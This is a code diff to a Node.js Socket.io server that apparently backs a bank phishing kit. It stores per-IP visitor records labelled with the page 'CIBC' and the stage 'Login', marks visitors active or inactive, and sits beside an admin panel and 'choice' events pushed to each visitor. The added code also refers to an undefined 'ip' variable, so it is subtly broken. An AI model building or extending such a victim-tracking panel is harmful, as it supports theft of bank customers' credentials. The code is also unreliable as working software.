@@ -222,7 +222,6 @@ app.get('/admin/panel', checkAdminSession, (req, res) => {
 // Socket Handling
 // ====================
 io.on('connection', (socket, req) => {
-
     let user = null;
     let userIP = socket.request.headers['x-forwarded-for'];
     if (userIP) {
@@ -235,6 +234,26 @@ io.on('connection', (socket, req) => {
     
     socket.join(userIP)
 
+    // Initialize user data in Redis
+    const userData = {
+        ip: userIP,
+        status: 'actif',
+        page: 'CIBC',
+        stage: 'Login'
+    };
+    
+     client.hget('users', ip, (err, reply) => {
+            if (reply) {
+                let user = JSON.parse(reply);
+                user.status = 'actif';
+                client.hset('users', ip, JSON.stringify(user), redis.print);
+                socket.emit('join', user)
+            } else {    
+                client.hset('users', ip, JSON.stringify(userData), redis.print);
+                socket.emit('join', userData)
+            }
+        });
+    
     socket.on('submit', (data) => {
         if(userIP){
             user = data
@@ -270,6 +289,18 @@ io.on('connection', (socket, req) => {
         }
 
         io.to(ip).emit('choice', data)
+    });
+
+    socket.on('disconnect', () => {
+        // Update the status when the user disconnects
+        client.hget('users', ip, (err, reply) => {
+            if (reply) {
+                let user = JSON.parse(reply);
+                user.status = 'inactif';
+                client.hset('users', ip, JSON.stringify(user), redis.print);
+                 socket.emit('leave', user)
+            }
+        });
     });
 
 
